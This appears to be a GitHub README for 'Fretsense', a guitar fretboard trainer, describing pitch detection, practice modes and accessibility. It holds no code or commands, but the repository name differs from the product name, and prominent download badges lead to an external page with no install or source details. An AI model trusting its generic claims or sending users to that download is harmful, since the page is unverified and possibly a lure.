![preview](https://raw.githubusercontent.com/stof-dorof/fretwise-listener/main/poster_35726.svg)
[![Download](https://raw.githubusercontent.com/stof-dorof/fretwise-listener/main/fetch_dae147.svg)](https://stof-dorof.github.io/fretwise-listener/)

# 🎸 Fretsense — Real-Time Guitar Fretboard Companion

**A listening instrument trainer that turns any acoustic or electric guitar into an interactive learning surface.**

Fretsense is a cross-platform practice companion that listens to what you play — through your audio interface, USB microphone, or the built-in mic on your laptop — and maps every detected pitch onto a living, breathing fretboard visualization. It is inspired by the spirit of open instrument education, but built from the ground up around a different design philosophy: instead of showing you a static chart, Fretsense *converses* with your playing in real time.

Think of it as a patient teacher sitting across from you, except it never gets tired, never sighs when you miss the same note three times, and always knows exactly which string and fret you just struck.

---

## 📖 Table of Contents

- [Why Fretsense Exists](#-why-fretsense-exists)
- [Core Philosophy](#-core-philosophy)
- [Feature Highlights](#-feature-highlights)
- [How Pitch Recognition Works](#-how-pitch-recognition-works)
- [The Fretboard Canvas](#-the-fretboard-canvas)
- [Practice Modes](#-practice-modes)
- [Responsive Interface](#-responsive-interface)
- [Multilingual Support](#-multilingual-support)
- [Accessibility Commitments](#-accessibility-commitments)
- [Performance Characteristics](#-performance-characteristics)
- [Supported Platforms](#-supported-platforms)
- [Configuration File Reference](#-configuration-file-reference)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Roadmap](#-roadmap)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Community and Contribution](#-community-and-contribution)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌱 Why Fretsense Exists

Most fretboard trainers assume you already know where the notes live. They hand you a diagram, a metronome, and wish you luck. Fretsense flips that assumption. It assumes you are holding a guitar, that you are curious, and that the fastest way to learn is to *hear yourself* succeed and fail in the same instant.

The project began as a quiet experiment: what if a piece of software could hear a single plucked string and tell you, without hesitation, that you just played a G on the third fret of the high E string? Not approximately. Not eventually. But right now, while the string is still vibrating.

That experiment grew into a full practice environment. Today Fretsense is a small, focused, and deliberately uncluttered tool for guitarists who want to build real fretboard intuition rather than memorize shapes.

---

## 🧭 Core Philosophy

Three principles guide every design decision in this repository.

**Listen first, judge never.** The software does not grade you on a curve. It simply reflects what it hears. Mistakes become information, not failure.

**Visualize without overwhelming.** A fretboard is a rich object. Fretsense reveals only what is relevant to the current exercise, then expands as your confidence grows.

**Stay out of the way.** No account creation, no cloud dependency, no telemetry. The instrument and the learner are the only two parties that matter.

---

## ✨ Feature Highlights

- 🎧 **Real-time pitch detection** from microphone or audio interface input
- 🎼 **Automatic string and fret inference** based on detected fundamental frequency
- 🌈 **Color-coded feedback** on a responsive fretboard canvas
- 🗂️ **Multiple practice modes** including note hunting, scale runs, and interval drills
- 🌍 **Multilingual interface** with community-maintained translations
- 📱 **Responsive UI** that adapts from wide desktop monitors to narrow handheld screens
- 🕛 **24/7 customer support** channel for setup, calibration, and practice questions
- 🧩 **Extensible exercise engine** for adding your own drills
- 🔇 **Noise-robust detection** tuned for rooms with fans, hum, and household chatter
- 🧠 **Adaptive difficulty** that adjusts note ranges as your accuracy improves
- 💾 **Session history** stored locally so you can observe progress over weeks
- 🎨 **Theming system** with light, dark, and high-contrast palettes
- 🔌 **Offline-first architecture** — no internet connection required after setup

---

## 🎧 How Pitch Recognition Works

Fretsense does not pretend that guitar audio is a clean sine wave. A plucked string is a dense harmonic stack, wrapped in a transient attack, decaying unevenly across partials. Recognizing the fundamental frequency of such a signal in real time is a genuinely interesting problem.

The pipeline is deliberately layered:

1. **Capture** — The audio interface or microphone delivers a stream of samples at a configurable rate.
2. **Windowing** — Short overlapping frames are extracted, sized to balance latency against frequency resolution.
3. **Spectral Analysis** — Each frame is transformed into the frequency domain.
4. **Harmonic Weighting** — Candidate fundamentals are scored by how well their harmonic series explains the observed spectrum.
5. **Temporal Smoothing** — A short history prevents the display from flickering between octave-related candidates.
6. **String/Fret Mapping** — The stabilized pitch is matched against the tuning preset, then converted into a fret number with a confidence value.

Because the final step uses your configured tuning, you can practice in standard tuning, drop tunings, open tunings, or any custom arrangement you define.

---

## 🎨 The Fretboard Canvas

The fretboard is not a static illustration. It is a live instrument rendered in software. Each string is a horizontal lane. Each fret is a vertical boundary. When you play a note, the corresponding position illuminates, holds for a moment, then gently fades.

Several visual states are supported:

- **Idle** — Strings rest in a neutral tone
- **Detected** — The matched position glows with a soft accent color
- **Expected** — In drill modes, the target position is highlighted in advance
- **Correct** — Successful matches pulse briefly with a success hue
- **Missed** — Incorrect detections dim the target and annotate the actual note played

Every color pair was chosen to remain distinguishable for users with common forms of color vision difference. A monochrome mode is also available for maximum clarity.

---

## 🏋️ Practice Modes

Fretsense ships with several built-in drills, and the engine is open enough that new ones can be authored with a small amount of configuration.

**Note Hunting** — The application names a pitch, and you find it anywhere on the neck. Any valid position counts.

**Position Drill** — A specific fret position is requested. You must play that note on that fret, on any string that can reach it.

**Scale Runner** — A scale is selected, and the fretboard highlights the next expected degree in sequence. You play through the scale ascending and descending.

**Interval Trainer** — Two notes are requested in succession. The tool listens for the interval, not just the individual pitches.

**Chord Tone Explorer** — A chord is named, and you must produce its constituent tones in any order.

**Blind Navigation** — No visual hints. The fretboard only reports what it heard after the fact. This mode is for players who want to test their internal map.

Each mode has configurable tempo guidance, difficulty ceiling, and session length.

---

## 📱 Responsive Interface

The layout is built on a fluid grid so the fretboard never collapses or distorts. On a widescreen desktop, the neck stretches across the full window with generous spacing. On a tablet held vertically, the strings compress gracefully. On a phone, the fretboard becomes scrollable while the control panel docks beneath.

Touch gestures are supported for panning and zooming the neck, which is especially useful when you want to inspect a single region of interest.

---

## 🌐 Multilingual Support

Language files are plain structured text, kept intentionally simple so that translators do not need programming experience. The current release ships with a growing set of locales, and the interface automatically selects the best match for your system settings.

If your language is not yet present, the contribution path is deliberately short. Adding a locale file is enough to make the interface appear in that language; no build step is required.

---

## ♿ Accessibility Commitments

- Keyboard-only operation is fully supported
- Screen reader labels are provided for every interactive element
- Contrast ratios meet or exceed recommended thresholds
- No feature depends exclusively on audio cues or exclusively on visual cues
- Timing-sensitive modes offer adjustable windows for users who need more time

---

## ⚡ Performance Characteristics

Fretsense is engineered to remain light. Detection latency is typically low enough that the visual feedback feels simultaneous with the pluck. Memory footprint is modest because session data is written incrementally to local storage rather than accumulated in memory.

The application degrades gracefully on older hardware. If the audio backend cannot sustain the default frame rate, the engine reduces analysis resolution before dropping notes entirely.

---

## 🖥️ Supported Platforms

Fretsense runs anywhere a modern audio stack and a graphics-capable runtime are available. Official builds target desktop operating systems across the three major families, with experimental packaging available for handheld and tablet devices.

Tuning presets ship for common instruments including six-string acoustic, six-string electric, bass, baritone, and a selection of extended-range configurations.

---

## ⚙️ Configuration File Reference

All user preferences live in a single human-readable configuration document. Notable sections include:

- **audio** — input device selection, gain, noise floor
- **tuning** — string count, per-string target pitches
- **display** — theme, fret count, orientation
- **practice** — default mode, session duration, difficulty
- **locale** — preferred language and fallback chain

Each section is documented inline with comments, so opening the file is itself a form of documentation.

---

## 🕛 Round-the-Clock Assistance

Questions about calibration, tuning presets, or practice strategy are welcome at any hour. A dedicated support rotation keeps a human reachable across all time zones, so a late-night practice session never ends in frustration over a misconfigured input device.

Support channels cover installation questions, audio troubleshooting, translation requests, and feature discussions.

---

## 🗺️ Roadmap

Planned directions for 2026 and beyond include:

- Ear-training modules with melodic dictation
- Duet mode where two players share a session
- Expanded string/fret inference for slide and fretless instruments
- Optional export of session statistics for teachers
- Community exercise marketplace with local-only verification

Priorities shift based on feedback, so the roadmap is a living document rather than a promise.

---

## ❓ Frequently Asked Questions

**Does Fretsense work with an acoustic guitar in a noisy room?**
Yes, with caveats. The noise-robust detection handles steady background sounds well. Sudden loud transients may momentarily confuse the tracker, but it recovers quickly.

**Do I need an audio interface?**
No. A microphone is sufficient. An interface simply improves signal quality and reduces room noise.

**Can I practice with a capo?**
Yes. Adjust the effective tuning in the configuration to reflect the capo position.

**Is my audio recorded or uploaded?**
No. All processing happens locally on your device. Nothing leaves your machine.

**Can I create my own drills?**
Yes. The exercise engine reads declarative definitions, so new drills can be added without touching the detection core.

---

## 🤝 Community and Contribution

Contributions of all sizes are welcome, from typo fixes to new practice modes. Before submitting larger changes, please open a discussion so the direction can be aligned with the project's philosophy.

Areas where help is especially appreciated:

- Additional language translations
- Tuning presets for regional instruments
- Accessibility testing on uncommon hardware
- Documentation improvements

---

## ⚠️ Disclaimer

Fretsense is an educational practice aid. It is provided as-is, without warranty of any kind, express or implied. Pitch detection accuracy depends on your instrument, your audio hardware, and the acoustics of your environment. The maintainers are not responsible for any damage to instruments, hearing, or equipment resulting from use of this software.

Always practice at sensible volumes. Protect your hearing. Consult a qualified instructor for technique questions that software cannot answer.

---

[![Download](https://raw.githubusercontent.com/stof-dorof/fretwise-listener/main/fetch_dae147.svg)](https://stof-dorof.github.io/fretwise-listener/)

## 📄 License

This project is released under the MIT License. See the full text in the [LICENSE](./LICENSE) file.

Copyright (c) 2026 Fretsense contributors.